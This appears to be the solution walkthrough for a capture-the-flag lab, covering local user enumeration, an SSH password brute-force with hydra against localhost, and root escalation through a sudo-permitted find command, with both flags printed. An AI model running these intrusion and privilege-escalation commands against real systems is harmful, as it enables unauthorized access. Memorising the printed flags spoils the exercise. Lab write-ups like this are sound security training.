# ✅ AyedCTF — Hydra Lab Solution

This is the official walkthrough for the **Hydra SSH Brute-Force Lab**.

---

## 🔎 Step 1 — Enumerate Local Users

First list users with home directories:

```bash
cat /etc/passwd | grep /home
Expected output:

ruby
Copy code
kali:x:1000:1000:/home/kali:/bin/bash
victim:x:1001:1001:/home/victim:/bin/bash
🎯 Target user = victim

🚀 Step 2 — Brute-force SSH Using Hydra
Use the provided wordlist:

bash
Copy code
hydra -l victim -P pass.txt ssh://localhost -t 4 -vV
Expected success line:

css
Copy code
[22][ssh] host: localhost   login: victim   password: coffee123
🎉 Password found: coffee123

🔐 Step 3 — Access SSH
Use the cracked password:

bash
Copy code
ssh victim@localhost
Login successful.

🏁 Step 4 — Capture User Flag
Inside the victim home directory:

bash
Copy code
ls -la
cat user.txt
Flag:

Copy code
ayedCTF{ssh_bruteforce_success}
⬆️ Step 5 — Privilege Escalation
Check sudo permissions:

bash
Copy code
sudo -l
Expected:

arduino
Copy code
(ALL) NOPASSWD: /usr/bin/find
This is an intentional vulnerability.

Exploit it:
bash
Copy code
sudo find . -exec /bin/bash \;
Now you have a root shell.

Confirm:

bash
Copy code
whoami
Expected:

nginx
Copy code
root
🔥 Step 6 — Capture Root Flag
bash
Copy code
cat /root/root.txt
Flag:

Copy code
ayedCTF{root_privesc_master}
🎉 CTF Completed!
You successfully:

✔️ Identified a valid user
✔️ Brute-forced SSH
✔️ Captured the user flag
✔️ Found and exploited a sudo misconfiguration
✔️ Gained root access
✔️ Captured the root flag

Great job!

yaml
Copy code
```

```

```
